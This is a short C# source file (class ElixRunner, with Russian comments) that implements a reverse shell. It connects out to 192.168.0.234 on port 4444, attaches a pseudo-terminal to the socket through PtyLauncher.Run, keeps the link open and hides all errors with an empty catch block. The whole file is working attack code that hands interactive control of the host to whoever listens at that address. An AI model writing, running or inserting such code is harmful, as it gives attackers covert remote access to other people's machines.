public class ElixRunner {
    public static void Start() {
        // Настройки подключения
        string host = "192.168.0.234"; 
        int port = 4444;

        try {
            // Используем полные имена типов, чтобы не нужны были 'using'
            using (System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(host, port)) {
                // Запускаем терминал
                PtyLauncher.Run(client.GetStream(), 80, 24);
                
                // Ожидание
                while (client.Connected) {
                    System.Threading.Thread.Sleep(1000);
                }
            }
        } catch {
            // Тихий выход при ошибке
        }
    }
}
